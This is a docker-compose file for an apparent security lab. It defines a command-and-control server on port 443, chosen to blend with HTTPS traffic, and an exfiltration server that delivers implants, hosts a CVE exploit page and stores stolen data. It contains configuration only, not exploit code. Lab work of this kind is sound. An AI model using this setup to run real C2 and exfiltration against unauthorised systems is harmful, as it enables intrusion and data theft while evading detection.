# docker-compose.yml
# Spins up the full lab: C2 server + exfil/exploit server
# Usage:
#   docker compose up --build        (build and start both)
#   docker compose up --build -d     (same, but detached)
#   docker compose down              (stop and remove containers)
#   docker compose logs -f           (tail logs from both)

services:

  # ── C2 Server (mTLS listener) ───────────────────────────────────────
  c2-server:
    build:
      # Root context so Dockerfile can COPY both c2-server/ and certs/
      context: .
      dockerfile: c2-server/Dockerfile
    container_name: c2-server
    hostname: c2-server
    stdin_open: true             # Keep stdin open for docker attach
    tty: true                    # Allocate a TTY so the controller menu works
    ports:
      - "443:443"                # C2 listener (mTLS TCP) — port 443 blends with HTTPS traffic
    environment:
      - C2_HOST=0.0.0.0
      - C2_PORT=443
      # BP2: single-use enrollment token — validated when implant presents CSR
      - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
    networks:
      - labnet
    restart: unless-stopped

  # ── Exfil + Exploit Server ─────────────────────────────────────────
  exfil-server:
    build:
      context: .
      dockerfile: exfil-server/Dockerfile
      args:
        - C2_HOST_IP=${C2_HOST_IP}
        - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
    container_name: exfil-server
    hostname: exfil-server
    ports:
      - "8443:443"               # nginx HTTPS implant delivery → host (one-time download)
      - "8888:8888"              # CVE exploit webpage → host
      # Port 8000 removed — Python http.server replaced by nginx + token_server
    environment:
      # DOWNLOAD_TOKEN injected at runtime so token_server.js can read it.
      # Generated by `openssl rand -hex 32` in launch.sh (BP3 — CSPRNG).
      - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
    volumes:
      # Persist exfiltrated data on the host across container restarts
      - ./exfil-data:/opt/exfil
    networks:
      - labnet
    restart: unless-stopped

# ── Shared Network ────────────────────────────────────────────────────
networks:
  labnet:
    driver: bridge
